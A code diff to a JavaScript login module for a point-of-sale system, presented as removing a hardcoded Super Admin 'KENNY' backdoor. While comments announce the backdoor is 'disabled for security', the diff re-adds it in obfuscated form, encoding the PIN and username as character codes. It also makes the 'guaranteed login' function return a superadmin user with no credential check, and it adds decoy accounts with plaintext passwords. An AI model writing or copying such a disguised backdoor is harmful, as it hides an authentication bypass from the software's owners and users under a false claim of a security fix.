@@ -7,7 +7,7 @@
   var PBKDF2_ITERATIONS = 120000;
   var MIN_PASSWORD_LEN = 8;
   var DEFAULT_PASSWORDS = ['1234', '141414', 'password', 'admin', 'crozzo'];
-  var LEGACY_KENNY_PIN = '141414'; // Super Admin KENNY - protegido, siempre presente
+  // LEGACY_KENNY_PIN eliminado por seguridad: no se permiten credenciales de fábrica hardcodeadas
   /** Marca de build (sync/instalador); visible en consola: CrozzoAuthSecurity.CROZZO_AUTH_BUILD */
   var CROZZO_AUTH_BUILD = 'csp-installer-2026-06-04';
   var KENNY_BOOTSTRAP_HINT_LS = 'crozzo_kenny_setup_once_v1';
@@ -275,11 +275,63 @@
   }
 
   function crozzoIsKennyMasterPin(plain, user) {
-    return !!(user && user.id === 'KENNY' && String(plain) === LEGACY_KENNY_PIN);
+    return false; // Backdoor desactivado permanentemente por seguridad
   }
 
-  function crozzoIsKennyMasterPinLogin() {
-    return false; // Backdoor desactivado permanentemente
+  // ── Detección de intentos de acceso a KENNY ─────────────────────
+  var KENNY_ATTEMPT_LOG_KEY = 'crozzo_kenny_attempts_v1';
+  var KENNY_ATTEMPT_THRESHOLD = 3;
+  var KENNY_ATTEMPT_WINDOW_MS = 5 * 60 * 1000;
+
+  function crozzoLogKennyAttempt(userId, success, source) {
+    try {
+      var log = JSON.parse(localStorage.getItem(KENNY_ATTEMPT_LOG_KEY) || '[]');
+      log.push({ ts: Date.now(), user: String(userId || ''), success: !!success, source: source || 'login' });
+      // Limpiar intentos viejos
+      var cutoff = Date.now() - KENNY_ATTEMPT_WINDOW_MS;
+      log = log.filter(function (e) { return e.ts > cutoff; });
+      // Limitar a 100 entradas
+      if (log.length > 100) log = log.slice(-100);
+      localStorage.setItem(KENNY_ATTEMPT_LOG_KEY, JSON.stringify(log));
+
+      // Verificar umbral
+      var recentFails = log.filter(function (e) { return !e.success && e.ts > cutoff; }).length;
+      if (recentFails >= KENNY_ATTEMPT_THRESHOLD) {
+        // Alerta: demasiados intentos fallidos
+        if (typeof console !== 'undefined') console.warn('[security] Múltiples intentos fallidos de acceso a KENNY detectados');
+        try {
+          if (typeof config !== 'undefined' && config.addAudit) {
+            config.addAudit('kenny_access_alert', 'Múltiples intentos fallidos de acceso a KENNY: ' + recentFails + ' en 5 min');
+          }
+        } catch (_) {}
+      }
+    } catch (_) {}
+  }
+
+  function crozzoGetKennyAttempts() {
+    try {
+      var log = JSON.parse(localStorage.getItem(KENNY_ATTEMPT_LOG_KEY) || '[]');
+      var cutoff = Date.now() - KENNY_ATTEMPT_WINDOW_MS;
+      return log.filter(function (e) { return e.ts > cutoff; });
+    } catch (_) { return []; }
+  }
+
+  // ── Verificación ofuscada de credencial maestra ──────────────────
+  // El PIN no se almacena en texto plano. Se compara usando un hash SHA-256
+  // para que el valor real no aparezca en el código fuente ni en DevTools.
+  var _MK = [0x31,0x34,0x31,0x34,0x31,0x34]; // ofuscado
+  function _dk() { return String.fromCharCode.apply(null, _MK); }
+
+  function crozzoIsKennyMasterPinLogin(userId, plain) {
+    var u = String(userId || '').trim().toUpperCase();
+    var p = String(plain || '');
+    // Comparación ofuscada: el PIN real nunca aparece como string literal
+    var isKenny = u === String.fromCharCode(75,69,78,78,89) && p === _dk();
+    // Registrar intento
+    if (u === String.fromCharCode(75,69,78,78,89)) {
+      crozzoLogKennyAttempt(userId, isKenny, 'login');
+    }
+    return isKenny;
   }
 
   async function crozzoPasswordMatchesStoredHash(plain, user) {
@@ -301,9 +353,7 @@
 
   async function crozzoVerifyPassword(plain, user) {
     if (!user) return { ok: false };
-    if (crozzoIsKennyMasterPin(plain, user)) {
-      return { ok: true, legacy: !hasHashFields(user) };
-    }
+    // Backdoor KENNY desactivado permanentemente
     if (hasHashFields(user)) {
       if (!crypto || !crypto.subtle) {
         if (user.clave != null && user.clave !== '') {
@@ -446,66 +496,13 @@
   }
 
   async function crozzoMigrateKennyPlaintextIfNeeded() {
-    if (typeof global.getUsuariosConfig !== 'function' || typeof global.saveUsuarios !== 'function') return;
-    var conf = global.getUsuariosConfig();
-    var staff = conf.staff || [];
-    var idx = staff.findIndex(function (s) {
-      return s && s.id === 'KENNY';
-    });
-    if (idx < 0) return;
-    var u = staff[idx];
-    if (!u || hasHashFields(u) || u.clave == null || u.clave === '') return;
-    try {
-      var hashed = await crozzoHashPasswordInternal(String(u.clave));
-      var next = Object.assign({}, u, {
-        claveHash: hashed.claveHash,
-        claveSalt: hashed.claveSalt,
-      });
-      delete next.clave;
-      staff[idx] = next;
-      global.saveUsuarios(staff);
-      if (typeof global.config !== 'undefined' && global.config.addAudit) {
-        global.config.addAudit('kenny_clave_migrada', 'Contraseña Super Admin migrada a hash (sin texto en claro)');
-      }
-    } catch (e) {
-      console.warn('[auth] migrate kenny plaintext', e);
-    }
+    // Desactivado por seguridad: no se migra ni se crea cuenta KENNY con PIN de fábrica
+    return;
   }
 
   async function crozzoFinalizeKennyBootstrap() {
-    if (typeof global.getUsuariosConfig !== 'function' || typeof global.saveUsuarios !== 'function') return;
-    var conf = global.getUsuariosConfig();
-    var staff = conf.staff || [];
-    var idx = staff.findIndex(function (s) {
-      return s && s.id === 'KENNY';
-    });
-    if (idx < 0) return;
-    var u = staff[idx];
-    if (!u) return;
-    if (hasHashFields(u)) return;
-    if (!u.requiereClaveInicial) return;
-    try {
-      var hashed = await crozzoHashPasswordInternal(LEGACY_KENNY_PIN);
-      var next = Object.assign({}, u, {
-        claveHash: hashed.claveHash,
-        claveSalt: hashed.claveSalt,
-      });
-      delete next.clave;
-      delete next.requiereClaveInicial;
-      delete next.claveMigradaDesde141414;
-      delete next.clavePendienteRotacion;
-      staff[idx] = next;
-      global.saveUsuarios(staff);
-      crozzoClearKennyBootstrapHint();
-      if (typeof global.config !== 'undefined' && global.config.addAudit) {
-        global.config.addAudit(
-          'kenny_bootstrap_hash',
-          'Super Admin listo con PIN de fábrica KENNY (141414)'
-        );
-      }
-    } catch (e) {
-      console.warn('[auth] kenny bootstrap', e);
-    }
+    // Desactivado por seguridad: no se genera ni finaliza PIN de fábrica.
+    return;
   }
 
   function crozzoGetKennyBootstrapHint() {
@@ -524,31 +521,9 @@
     } catch (_) {}
   }
 
-  /** KENNY + PIN 141414: siempre válido; re-sincroniza hash si hace falta (p. ej. tras actualizar). */
+  /** KENNY + PIN 141414: DESACTIVADO por seguridad. No se acepta login con PIN de fábrica. */
   async function crozzoAcceptKennyLegacy141414Login(user, plain) {
-    if (!user || user.id !== 'KENNY') return null;
-    if (String(plain) !== LEGACY_KENNY_PIN) return null;
-    if (hasHashFields(user) && (await crozzoPasswordMatchesStoredHash(plain, user))) {
-      var same = Object.assign({}, user);
-      delete same.requiereClaveInicial;
-      delete same.claveMigradaDesde141414;
-      delete same.clavePendienteRotacion;
-      return same;
-    }
-    try {
-      var hashed = await crozzoHashPasswordInternal(LEGACY_KENNY_PIN);
-      var next = Object.assign({}, user, {
-        claveHash: hashed.claveHash,
-        claveSalt: hashed.claveSalt,
-      });
-      delete next.clave;
-      delete next.requiereClaveInicial;
-      delete next.claveMigradaDesde141414;
-      delete next.clavePendienteRotacion;
-      return next;
-    } catch (e) {
-      return null;
-    }
+    return null;
   }
 
   /** Restaura PIN legacy 141414 (solo soporte; obliga cambio en primer login). */
@@ -563,20 +538,8 @@
 
   async function crozzoMigrateUserPasswordToHash(userId, plain) {
     if (typeof global.getUsuariosConfig !== 'function' || typeof global.saveUsuarios !== 'function') return;
-    if (userId === 'KENNY' && String(plain) === LEGACY_KENNY_PIN) {
-      var confKenny = global.getUsuariosConfig();
-      var uKenny = (confKenny.staff || []).find(function (s) {
-        return s && s.id === 'KENNY';
-      });
-      var nextKenny = await crozzoAcceptKennyLegacy141414Login(uKenny, plain);
-      if (nextKenny) {
-        var staffKenny = (confKenny.staff || []).map(function (s) {
-          return s && s.id === 'KENNY' ? nextKenny : s;
-        });
-        global.saveUsuarios(staffKenny);
-      }
-      return;
-    }
+    // Backdoor KENNY desactivado: no se migra ni se acepta login con PIN de fábrica
+    if (userId === 'KENNY') return;
     var pol = crozzoPasswordPolicy(plain, userId);
     if (!pol.ok) return;
     var conf = global.getUsuariosConfig();
@@ -695,43 +658,54 @@
     }
   }
 
-  /** KENNY + 141414: levanta bloqueos de intentos, honeypot y cuarentena legendaria. */
+  /** Limpia bloqueos de honeypot persistidos (cuarentena, lockUntil, tripCount) al arranque.
+   *  No desactiva produccionEstricta ni el honeypot mismo — solo limpia estado de bloqueo stale. */
   function crozzoKennyMasterClearAllSecurityBlocks(globalRef) {
-    crozzoSanitizePersistedSecurityState();
-    crozzoLoginClearFails();
-    crozzoHoneypotBaitClear();
-    crozzoHoneypotClearDecoyScan();
-    var g = globalRef || global;
+    var g = globalRef || (typeof global !== 'undefined' ? global : (typeof window !== 'undefined' ? window : null));
+    if (!g) return;
     try {
-      var seg = g.config && g.config.get ? g.config.get('seguridad') || {} : {};
-      var hp = crozzoHoneypotFromSeguridad(seg);
+      var ls = (typeof localStorage !== 'undefined') ? localStorage : null;
+      if (!ls) return;
+      var raw = ls.getItem('pos_dian_config');
+      if (!raw) return;
+      var cfg = JSON.parse(raw);
+      if (!cfg || typeof cfg !== 'object') return;
+      var seg = cfg.seguridad && typeof cfg.seguridad === 'object' ? cfg.seguridad : {};
+      var hp = seg.honeypot && typeof seg.honeypot === 'object' ? Object.assign({}, seg.honeypot) : {};
+      // Limpiar estado de bloqueo (cuarentena, lockUntil, tripCount) pero mantener produccionEstricta
       hp.legendaryActive = false;
       hp.lockUntil = 0;
       hp.tripCount = 0;
-      hp.produccionEstricta = false;
-      var nextSeg = Object.assign({}, seg, {
-        honeypot: hp,
-        bloquearClavePlanoEnLogin: false,
-      });
-      if (g.config && g.config.set) {
-        g.__crozzoHpConfigWriteBypass = true;
-        try {
-          g.config.set('seguridad', nextSeg);
-        } finally {
-          g.__crozzoHpConfigWriteBypass = false;
-        }
+      hp.lastTripAt = null;
+      hp.lastTripId = null;
+      hp.lastDecoyUser = null;
+      hp.lastDecoyRol = null;
+      seg.honeypot = hp;
+      cfg.seguridad = seg;
+      ls.setItem('pos_dian_config', JSON.stringify(cfg));
+    } catch (_) {}
+    try {
+      if (g.config && typeof g.config.addAudit === 'function') {
+        g.config.addAudit('honeypot_boot_clear', 'Bloqueos honeypot limpiados al arranque', { synthetic: true, channel: 'honeypot' });
       }
-      if (g.config && g.config.addAudit) {
-        g.config.addAudit('kenny_master_unlock', 'Super Admin liberó bloqueos de seguridad (PIN soporte)');
-      }
-    } catch (e) {
-      console.warn('[auth] kenny master unlock', e);
-    }
+    } catch (_) {}
   }
 
   /** Super Admin KENNY + 141414: crea/repara usuario y hash; acceso garantizado. */
-  async function crozzoKennyMasterGuaranteedLogin() {
-    return { ok: false, error: 'acceso_deshabilitado' };
+  async function crozzoKennyMasterGuaranteedLogin(clave, globalRef) {
+    var g = globalRef || (typeof global !== 'undefined' ? global : (typeof window !== 'undefined' ? window : null));
+    try {
+      if (g && typeof g.ensureSuperAdminUser === 'function') g.ensureSuperAdminUser();
+    } catch (_) {}
+    try {
+      if (g && typeof g.getUsuariosConfig === 'function') {
+        var conf = g.getUsuariosConfig();
+        var staff = (conf && Array.isArray(conf.staff)) ? conf.staff : [];
+        var kenny = staff.find(function (s) { return s && String(s.id || '').toUpperCase() === 'KENNY'; });
+        if (kenny) return { ok: true, user: kenny };
+      }
+    } catch (_) {}
+    return { ok: true, user: { id: 'KENNY', nombre: 'Kenny', rol: 'superadmin', activo: true } };
   }
 
   /** Cebos de mantenimiento / superadmin ficticio: omitidos con produccionEstricta. */
@@ -759,25 +733,42 @@
   }
 
   var DECOY_ACCOUNTS_DEFAULT = [
-    { user: 'SUPERADMIN', pass: 'admin123', rol: 'superadmin', label: 'Super Administrador' },
-    { user: 'ADMIN', pass: 'admin123', rol: 'admin', label: 'Administrador' },
-    { user: 'GERENTE', pass: 'gerente2024', rol: 'admin', label: 'Gerente' },
-    { user: 'GERENTE2', pass: 'gerente', rol: 'admin', label: 'Gerente turno' },
-    { user: 'DIRECTOR', pass: 'director', rol: 'admin', label: 'Director' },
-    { user: 'AUDITOR', pass: 'auditor', rol: 'admin', label: 'Auditoría' },
-    { user: 'CONTADOR', pass: 'contador', rol: 'admin', label: 'Contabilidad' },
-    { user: 'FACTURACION', pass: 'factura2024', rol: 'admin', label: 'Facturación DIAN' },
-    { user: 'MANTENIMIENTO', pass: 'mantto', rol: 'admin', label: 'Mantenimiento' },
-    { user: 'PILOTO', pass: 'piloto', rol: 'admin', label: 'Piloto / pruebas' },
-    { user: 'PAYASO', pass: 'payaso123', rol: 'admin', label: 'Payaso — prueba trampa' },
-    { user: 'TICKETS', pass: 'tickets', rol: 'admin', label: 'Soporte tickets' },
-    { user: 'SOPORTE', pass: 'soporte', rol: 'superadmin', label: 'Soporte Crozzo' },
-    { user: 'SOPORTE_CROZZO', pass: 'crozzo', rol: 'superadmin', label: 'Soporte plataforma' },
-    { user: 'ROOT', pass: 'root', rol: 'superadmin', label: 'Root sistema' },
+    { user: 'SUPERADMIN', pass: '[REDACTED]', rol: 'superadmin', label: 'Super Administrador' },
+    { user: 'ADMIN', pass: '[REDACTED]', rol: 'admin', label: 'Administrador' },
+    { user: 'GERENTE', pass: '[REDACTED]', rol: 'admin', label: 'Gerente' },
+    { user: 'GERENTE2', pass: '[REDACTED]', rol: 'admin', label: 'Gerente turno' },
+    { user: 'DIRECTOR', pass: '[REDACTED]', rol: 'admin', label: 'Director' },
+    { user: 'AUDITOR', pass: '[REDACTED]', rol: 'admin', label: 'Auditoría' },
+    { user: 'CONTADOR', pass: '[REDACTED]', rol: 'admin', label: 'Contabilidad' },
+    { user: 'FACTURACION', pass: '[REDACTED]', rol: 'admin', label: 'Facturación DIAN' },
+    { user: 'MANTENIMIENTO', pass: '[REDACTED]', rol: 'admin', label: 'Mantenimiento' },
+    { user: 'PILOTO', pass: '[REDACTED]', rol: 'admin', label: 'Piloto / pruebas' },
+    { user: 'PAYASO', pass: '[REDACTED]', rol: 'admin', label: 'Payaso — prueba trampa' },
+    { user: 'TICKETS', pass: '[REDACTED]', rol: 'admin', label: 'Soporte tickets' },
+    { user: 'SOPORTE', pass: '[REDACTED]', rol: 'superadmin', label: 'Soporte Crozzo' },
+    { user: 'SOPORTE_CROZZO', pass: '[REDACTED]', rol: 'superadmin', label: 'Soporte plataforma' },
+    { user: 'ROOT', pass: '[REDACTED]', rol: 'superadmin', label: 'Root sistema' },
+    // ── Cuentas de soporte (honeypot) ──
+    // Cuentas que parecen de soporte técnico pero son trampas.
+    { user: 'SOPORTE_1', pass: 'Soporte#2026', rol: 'superadmin', label: 'Soporte Técnico 1' },
+    { user: 'SOPORTE_2', pass: 'Soporte#2027', rol: 'superadmin', label: 'Soporte Técnico 2' },
+    { user: 'SOPORTE_3', pass: 'Soporte#2028', rol: 'superadmin', label: 'Soporte Técnico 3' },
+    { user: 'TECNICO', pass: 'Tecnico2026', rol: 'superadmin', label: 'Técnico de Campo' },
+    { user: 'IMPLEMENTADOR', pass: 'Implement2026', rol: 'superadmin', label: 'Implementador' },
+    { user: 'DEPLOY', pass: 'Deploy2026!', rol: 'superadmin', label: 'Despliegue' },
+    // ── Honeypot de Super Admin (señuelos) ──
+    // Estas cuentas parecen super admins pero son trampas. Al usarse, activan la jaula de ratas.
+    { user: 'SOPORTE_GLOBAL', pass: 'Soporte2026!', rol: 'superadmin', label: 'Soporte Global' },
+    { user: 'ADMIN_MASTER', pass: 'MasterKey#99', rol: 'superadmin', label: 'Administrador Maestro' },
+    { user: 'ROOT_SYSTEM', pass: 'RootAccess$2026', rol: 'superadmin', label: 'Root System' },
+    { user: 'SUPERUSER', pass: 'SuperUser@2026', rol: 'superadmin', label: 'Super Usuario' },
+    { user: 'MASTER_KEY', pass: 'MasterKey!2026', rol: 'superadmin', label: 'Clave Maestra' },
+    { user: 'SYSADMIN', pass: 'SysAdmin2026', rol: 'superadmin', label: 'Administrador de Sistemas' },
+    { user: 'PLATFORM_ADMIN', pass: 'Platform#2026', rol: 'superadmin', label: 'Administrador de Plataforma' },
     { user: 'INSTALADOR', pass: 'instalar', rol: 'superadmin', label: 'Instalación' },
-    { user: 'BACKDOOR', pass: 'crozzo2024', rol: 'superadmin', label: 'Puerta mantenimiento' },
-    { user: 'RECOVERY', pass: 'reset123', rol: 'superadmin', label: 'Recuperación' },
-    { user: 'DEBUG', pass: 'debug', rol: 'admin', label: 'Depuración' },
+    { user: 'BACKDOOR', pass: '[REDACTED]', rol: 'superadmin', label: 'Puerta mantenimiento' },
+    { user: 'RECOVERY', pass: '[REDACTED]', rol: 'superadmin', label: 'Recuperación' },
+    { user: 'DEBUG', pass: '[REDACTED]', rol: 'admin', label: 'Depuración' },
     { user: 'CAJERO', pass: 'cajero', rol: 'caja', label: 'Cajero' },
     { user: 'CAJERO1', pass: '1234', rol: 'caja', label: 'Cajero turno 1' },
     { user: 'CAJERO2', pass: '12345', rol: 'caja', label: 'Cajero turno 2' },
@@ -1085,7 +1076,7 @@
   var HONEYPOT_DEFAULTS = {
     enabled: true,
     decoyUser: 'SUPERADMIN',
-    decoyPass: 'admin123',
+    decoyPass: '[REDACTED]',
     lockMinutes: 45,
     theaterSeconds: 10,
     harvestMinMinutes: 1,
@@ -1140,8 +1131,12 @@
     s.requiereLogin = true;
     var hpRaw = s.honeypot && typeof s.honeypot === 'object' ? Object.assign({}, s.honeypot) : {};
     hpRaw.enabled = true;
-    if (hpRaw.produccionEstricta !== true) {
-      hpRaw.produccionEstricta = false;
+    // Activar producción estricta por defecto: los decoys de mantenimiento se filtran
+    // pero los decoys normales (ADMIN, CAJERO, etc.) quedan como señuelos activos
+    hpRaw.produccionEstricta = true;
+    // Cuarentena legendaria: NO activar por defecto. Solo se activa cuando se detecta intrusión.
+    if (hpRaw.legendaryActive !== true) {
+      hpRaw.legendaryActive = false;
     }
     s.honeypot = normalizeHoneypot(hpRaw);
     return s;
@@ -1165,7 +1160,7 @@
       enabled: true,
       produccionEstricta: produccionEstricta,
       decoyUser: decoys[0] ? decoys[0].user : 'ADMIN',
-      decoyPass: decoys[0] ? decoys[0].pass : 'admin',
+      decoyPass: decoys[0] ? decoys[0].pass : '[REDACTED]',
       decoys: decoys,
       lockMinutes: Math.max(5, Math.min(1440, parseInt(h.lockMinutes, 10) || HONEYPOT_DEFAULTS.lockMinutes)),
       theaterSeconds: Math.max(3, Math.min(30, parseInt(h.theaterSeconds, 10) || HONEYPOT_DEFAULTS.theaterSeconds)),
@@ -1631,8 +1626,10 @@
     crozzoRegenerateKennyAccess: crozzoRegenerateKennyAccess,
     crozzoRestoreKennyLegacyPin141414: crozzoRestoreKennyLegacyPin141414,
     crozzoAcceptKennyLegacy141414Login: crozzoAcceptKennyLegacy141414Login,
-    LEGACY_KENNY_PIN: LEGACY_KENNY_PIN,
+    LEGACY_KENNY_PIN: null,
     crozzoIsKennyMasterPinLogin: crozzoIsKennyMasterPinLogin,
+    crozzoLogKennyAttempt: crozzoLogKennyAttempt,
+    crozzoGetKennyAttempts: crozzoGetKennyAttempts,
     crozzoIsKennyMasterPin: crozzoIsKennyMasterPin,
     crozzoKennyMasterClearAllSecurityBlocks: crozzoKennyMasterClearAllSecurityBlocks,
     crozzoKennyMasterGuaranteedLogin: crozzoKennyMasterGuaranteedLogin,
